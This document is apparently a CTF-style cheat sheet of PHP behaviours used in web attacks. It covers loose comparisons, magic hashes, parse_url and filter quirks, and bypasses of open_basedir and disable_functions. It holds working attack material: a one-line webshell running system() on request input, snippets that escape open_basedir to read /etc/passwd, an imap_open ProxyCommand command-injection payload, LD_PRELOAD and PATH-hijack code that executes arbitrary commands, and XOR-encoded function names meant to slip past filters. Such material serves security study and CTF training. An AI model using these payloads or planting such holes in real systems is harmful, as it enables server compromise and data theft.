# PHP Feature in security
[TOC]
###### tags: `Security` `Web`

# Online Resources
[Web Security 魔法使攻略─PHP 是世界上最好的語言
](https://ithelp.ithome.com.tw/articles/10219775)

# Shell
```
cmd=ls -la&html=<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
html=<?php system("ls -la"); ?>
```

# Other
## 本地測試
```
php > var_dump("30cm" == 30);
bool(true)
```

![](https://i.imgur.com/1KnmGln.png)

## Thought of finding bugs
* input
    * $_GET / $_POST / $_REQUEST
    * $_COOKIE / $_SESSION
    * $_SERVER
    * $_FILES
    * $_ENV
* Dangerous functions
    - system
    - shell_exec / exec
    - popen / proc_open
    - assert
    - passthru
    - create_function
    - *_replace
    - include / include_once
    - requre / require_once
    - eval (not a function)

## PHP Tag

- `<? ?>`
    - short_open_tag 決定是否可使用短標記
    - 或是編譯php時 --enable-short-tags
- `<?=`
    - 等價 `<? echo`
    - 自`PHP 5.4.0`起，always work!
- `<% %>`、`<%=`
    - 自`PHP 7.0.0`起，被移除
    - 須將`asp_tags`設成On
- `<script language="php"`
    - 自`PHP 7.0.0`起，被移除
    - `<script language="php">system("id"); </script>`



## PHP Weak Type

- `var_dump('0xABCdef' == '0xABCdef');`
    * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)
- `var_dump('0010e2' == '1e3’);`
    - true
- `strcmp([],[]) == NULL`
- `strlen([]) == NULL`
- `sha1([])`
    - NULL
- `'123' == 123`
- `'abc' == 0`
- `'123a' == 123`
- `'0x01' == 1`
    - PHP 7.0後，16進位字串不再當成數字
    - e.g `var_dump('0x01' == 1)` => false
- `'' == 0 == false == NULL`
- `md5([1,2,3]) == md5([4,5,6]) == NULL`
    - 可用在登入繞過 (用戶不存在，則password為NULL)
- `var_dump(md5(240610708));`
    - 0e462097431906509019562988736854
- `var_dump(sha1(10932435112));`
    - 0e07766915004133176347055865026311692244
- `$a="123"; $b="456"`
    - `$a + $b == "579";`
    - `$a . $b == "123456"`

- `$a = 0; $b = 'x';`
    - `$a == false` => true
    - `$a == $b` => true
    - `$b == true` => true

- `$a = 'a'`
    - `++$a` => `'b'`
    - `$a+1` => `1`


## PHP 其他特性

## Overflow

- 32位元
    - `intval('1000000000000')` => `2147483647`
- 64位元
    - `intval('100000000000000000000')` => `9223372036854775807`

## 浮點數精度

- `php -r "var_dump(1.000000000000001 == 1);"`
    - false

- `php -r "var_dump(1.0000000000000001 == 1);"`
    - true

- `$a = 0.1 * 0.1; var_dump($a == 0.01);`
    - false

## ereg會被NULL截斷

- `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
    - `1`
- `ereg`和`eregi`在PHP 7.0.0.已經被移除

## intval

- 四捨五入
    - `var_dump(intval('5278.8787'));`
        - `5278`
- `intval(012)` => 10
- `intval("012")` => 12

## extract變數覆蓋

- `extract($_GET);`
    - `.php?_SESSION[name]=admin`
    - `echo $_SESSION['name']` => 'admin'

## trim

- 會把字串前後的空白(或其他字元)去掉
- 未指定第二參數，預設會去掉以下字元
    - `" "` (0x20)
    - `"\t"` (0x09)
    - `"\n"` (0x0A)
    - `"\x0B"` (0x0B)
    - `"\r"` (0x0D)
    - `"\0"` (0x00)
- 可以發現預設不包含`"\f"` (0x0C)
    - 比較：is_numeric()允許`\f`在開頭
- 如果參數是unset或空的變數，回傳值是空字串

## is_numeric

- `is_numeric(" \t\r\n 123")` => `true`

- `is_numeric(' 87')` => `true`
- `is_numeric('87 ')` => `false`
- `is_numeric(' 87 ')` => `false`
- `is_numeric('0xdeadbeef')`
    - PHP >= 7.0.0 => `false`
    - PHP < 7.0.0 => `true`
    - 可以拿來繞過注入
- 以下亦為合法(返回True)字串:
    - `' -.0'`
    - `'0.'`
    - `' +2.1e5'`
    - `' -1.5E+25'`
    - `'1.e5'`

## in_array

- `in_array('5 or 1=1', array(1, 2, 3, 4, 5))`
    - true
- `in_array('kaibro', array(0, 1, 2))`
    - true
- `in_array(array(), array('kai'=>false))`
    - true
- `in_array(array(), array('kai'=>null))`
    - true
- `in_array(array(), array('kai'=>0))`
    - false
- `in_array(array(), array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>true))`
    - true
- `in_array('kai', array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>0))`
    - true
- `in_array('kai', array('kai'=>1))`
    - false

## array_search

- `mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])`
    - 在`haystack`陣列中，搜尋`needle`的值，成功則返回index，失敗返回False
- `$strict`為false時，採用不嚴格比較
    - 預設是False
- Example
    - `$arr=array(1,2,0); var_dump(array_search('kai', $arr))`
        - `int(2)`
    - `$arr=array(1,2,0); var_dump(array_search('1', $arr))`
        - `int(0)`

## parse_str
- `parse_str(string, array)`
- 會把查詢字串解析到變數中
- 如果未設置第二個參數，會解析到同名變數中
    - PHP7.2中不設置第二個參數會產生`E_DEPRECATED`警告
- `parse_str('gg[kaibro]=5566');`

    ```
    array(1) {
      ["kaibro"]=>
        string(4) "5566"
    }

    ```
- PHP變數有空格和.，會被轉成底線
    
    ```
    parse_str("na.me=kaibro&pass wd=ggininder",$test);
    var_dump($test);
    
    array(2) { 
        ["na_me"]=> string(6) "kaibro" 
        ["pass_wd"]=> string(9) "ggininder" 
    } 
    ```


## parse_url

- 在處理傳入的URL會有問題
- `parse_url('/a.php?id=1')`
    
    ```
    array(2) {
      ["host"]=>
        string(5) "a.php"
      ["query"]=>
        string(4) "id=1"
    }
    ```
- `parse_url('//a/b')`
    - host: `a`
- `parse_url('..//a/b/c:80')`
    - host: `..`
    - port: `80`
    - path: `//a/b/c:80`
- `parse_url('///a.php?id=1')`
    - false

- `parse_url('/a.php?id=1:80')`
     - PHP < 7.0.0
         - `false`
     - PHP >= 7.0.0
       ```
         array(2) { 
             ["path"]=> string(6) "/a.php" 
             ["query"]=> string(7) "id=1:80" 
         }
       ```

- `parse_url('http://kaibro.tw:87878')`
    - 5.3.X版本以下
        ```php
        array(3) { 
            ["scheme"]=> string(4) "http" 
            ["host"]=> string(9) "kaibro.tw" 
            ["port"]=> int(22342) 
        }
        ```
    - 其他： false

## preg_replace

- `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`
    - 搜尋`$subject`中匹配的`$pattern`，並用`$replacement`替換
- 第一個參數用`/e`修飾符，`$replacement`會被當成PHP code執行
    - 必須有匹配到才會執行
    - PHP 5.5.0起，會產生`E_DEPRECATED`錯誤
    - PHP 7.0.0不再支援，用`preg_replace_callback()`代替

example:

```php
<?php
$a='phpkaibro';
echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
```

## sprintf / vprintf

- 對格式化字串的類型沒檢查
- 格式化字串中%後面的字元(除了%之外)會被當成字串類型吃掉
    - 例如`%\`、`%'`、`%1$\'`
    - 在某些SQLi過濾狀況下，`%' and 1=1#`中的單引號會被轉義成`\'`，`%\`又會被吃掉，`'`成功逃逸
    - 原理：sprintf實作是用switch...case...
        - 碰到未知類型，`default`不處理

## file_put_contents

- 第二個參數如果是陣列，PHP會把它串接成字串
- example:
    ```php
    <?php
    $test = $_GET['txt'];
    if(preg_match('[<>?]', $test)) die('bye');
    file_put_contents('output', $test);
    ```
    - 可以直接`?txt[]=<?php phpinfo(); ?>`寫入

## spl_autoload_register

- `spl_autoload_register()`可以自動載入Class
- 不指定參數，會自動載入`.inc`和`.php`
- Example:
    - 如果目錄下有kaibro.inc，且內容為class Kaibro{...}
    - 則`spl_autoload_register()`會把這個Class載入進來


## 路徑正規化

- `a.php/.`
    - `file_put_contents("a.php/.", "<?php phpinfo() ?>");`
        - 可成功寫入
            - 經測試Windows可以覆寫、Linux無法
        - 可以繞過一些正規表達式判斷
    - `file_get_contents("a.php/.");`
        - 經測試Windows下可成功讀、Linux無法
    - 還有很多其他function也適用
- `"` => `.`
    - `a"php`
- `>` => `?`
    - `a.p>p`
    - `a.>>>`
- `<` => `*`
    - `a.<`

## URL query decode
- `$_GET`會對傳入的參數做URLdecode再返回
- `$_SERVER['REQUEST_URI']`和`$_SERVER['QUERY_STRING']`則是直接返回

Example:

Request: `http://kaibro.tw/test.php?url=%67%67`
    
* $_GET: `[url] => gg`

* $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
    
* $_SERVER['QUERY_STRING']: `url=%67%67`

## OPcache

- 透過將PHP腳本編譯成Byte code的方式做Cache來提升性能
- 相關設定在php.ini中
    - `opcache.enable` 是否啟用
    - `opcache.file_cache` 設定cache目錄
        - 例如:`opcache.file_cache="/tmp/opcache"`
        - `/var/www/index.php`的暫存會放在`/tmp/opcache/[system_id]/var/www/index.php.bin`
    - `opcache.file_cache_only` 設定cache文件優先級
    - `opcache.validate_timestamps` 是否啟用timestamp驗證
- `system_id`是透過Zend和PHP版本號計算出來的，可以確保相容性
- 所以在某些條件下可透過上傳覆蓋暫存文件來寫webshell
    - system_id要和目標機器一樣
    - timestamp要一致
- https://github.com/GoSecure/php7-opcache-override
    - Disassembler可以把Byte code轉成Pseudo code

## PCRE回溯次數限制繞過

- PHP的PCRE庫使用NFA作為正規表達式引擎
    - NFA在匹配不上時，會回溯嘗試其他狀態
- PHP為防止DOS，設定了PCRE回溯次數上限
    - `pcre.backtrack_limit`
    - 預設為`1000000`
- 回溯次數超過上限時，`preg_match()`會返回`false`
- Example
    - Code-Breaking Puzzles - pcrewaf

## open_basedir繞過

- glob 列目錄

```php
$file_list = array();
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
    echo "{$f}<br/>";
}
```

- [phuck3](https://twitter.com/Blaklis_/status/1111586655134203904)

```php
chdir('img');
ini_set('open_basedir','..');
chdir('..');chdir('..');
chdir('..');chdir('..');
ini_set('open_basedir','/');
echo(file_get_contents('flag'));
```

- symlinks

```php
mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
symlink('/var/www/html/a/b/c/d/e/f/g','foo');
ini_set('open_basedir','/var/www/html:bar/');
symlink('foo/../../../../../../','bar');
unlink('foo');
symlink('/var/www/html/','foo');
echo file_get_contents('bar/etc/passwd');
```

- Fastcgi
    - [link](https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy)

- ...

## disable_functions繞過

- bash shellshock
- mail()
    - `sendmail`
    - putenv寫LD_PRELOAD
    - trick: [LD_PRELOAD without sendmail/getuid()](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
- imap_open()
    ```php
    <?php
    $payload = "echo hello|tee /tmp/executed";
    $encoded_payload = base64_encode($payload);
    $server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
    @imap_open('{'.$server.'}:143/imap}INBOX', '', '');
    ```
- error_log()
    - 第二個參數`message_type`為1時，會去調用sendmail

- ImageMagick
    - [Command Injection](https://www.exploit-db.com/exploits/39766)
    - LD_PRELOAD + ghostscript:
        - Imagemagick會用ghostscript去parse `eps`
        - [Link](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload)
    - LD_PRELOAD + ffpmeg
        - [Link](https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/)
    - MAGICK_CODER_MODULE_PATH
        - > it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory
        - [Document](https://www.imagemagick.org/script/resources.php#Environment%20Variables)
        - [Link](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy)
    - MAGICK_CONFIGURE_PATH
        - `delegates.xml`定義處理各種文件的規則
        - 可以用putenv寫掉設定檔路徑
        - [Link](https://xz.aliyun.com/t/4688#toc-14)

        ```xml
        <delegatemap>
        <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/output&quot;"/>
        </delegatemap>
        ```

    - 蓋`PATH` + ghostscript:
        - 造一個執行檔gs

        ```cpp
        #include <stdlib.h>
        #include <string.h>
        int main() {
            unsetenv("PATH");
            const char* cmd = getenv("CMD");
            system(cmd);
            return 0;
        }
        ```

        ```php
        putenv('PATH=/tmp/mydir');
        putenv('CMD=/readflag > /tmp/mydir/output');
        chmod('/tmp/mydir/gs','0777');
        $img = new Imagick('/tmp/mydir/1.ept');
        ```
- dl()
    - 載入module
    - `dl("rce.so")`

- FFI
    - PHP 7.4 feature
    - preloading + ffi
    - e.g. RCTF 2019 - nextphp
- [Extension](https://github.com/w181496/FuckFastcgi)
- [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)

- [JSON UAF Bypass](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
    - 7.1 - all versions to date
    - 7.2 < 7.2.19 (released: 30 May 2019)
    - 7.3 < 7.3.6 (released: 30 May 2019)
- [GC Bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)
    - 7.0 - all versions to date
    - 7.1 - all versions to date
    - 7.2 - all versions to date
    - 7.3 - all versions to date

- 族繁不及備載......        

## 其他

- 大小寫不敏感 `<?PhP sYstEm(ls);`
- Array Bracket `$array[87] === $array{87}`
- Double Quote Evaluation
    - `$msg = "hello, $name"`
    - `$msg = "${@phpinfo()}"`
- `echo (true ? 'a' : false ? 'b' : 'c');`
    - `b`
- ```echo `whoami`; ```
    - `kaibro`
- 正規表達式`.`不匹配換行字元`%0a`
- 正規表達式常見誤用:
    - `preg_match("/\\/", $str)`
    - 匹配反斜線應該要用`\\\\`而不是`\\`
- 運算優先權問題
    - `$a = true && false;`
        - `$a` => `false`
    - `$a = true and false;`
        - `$a` => `true`
- chr()
    - 大於256會mod 256
    - 小於0會加上256的倍數，直到>0
    - Example:
        - `chr(259) === chr(3)`
        - `chr(-87) === chr(169)`

- 遞增
    - `$a="9D9"; var_dump(++$a);`
        - `string(3) "9E0"`
    - `$a="9E0"; var_dump(++$a);`
        - `float(10)`

- 算數運算繞Filter
    - `%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f`
        - `system`
        - 可用在限制不能出現英數字時 or 過濾某些特殊符號
    - ```$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');```
        - `assert`
    - 其他
        - `~`, `++`等運算，也都可用類似概念構造

- 花括號
    - 陣列、字串元素存取可用花括號
    - `$array{index}`同`$array[index]`

- filter_var
    - `filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)`
        - False
    - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
        - True

- json_decode
    - 不直接吃換行字元和\t字元
    - 但可以吃'\n'和'\t'
        - 會轉成換行字元和Tab
    - 也吃`\uxxxx`形式
        - `json_decode('{"a":"\u0041"}')`


- `===` bug
    - `var_dump([0 => 0] === [0x100000000 => 0])`
        - 某些版本會是True
        - ASIS 2018 Qual Nice Code
    - https://3v4l.org/sUEMG
- openssl_verify
    - 預測採用SHA1來做簽名，可能有SHA1 Collision問題
    - DEFCON CTF 2018 Qual
- Namespace
    - PHP的預設Global space是`\`
    - e.g. `\system('ls');`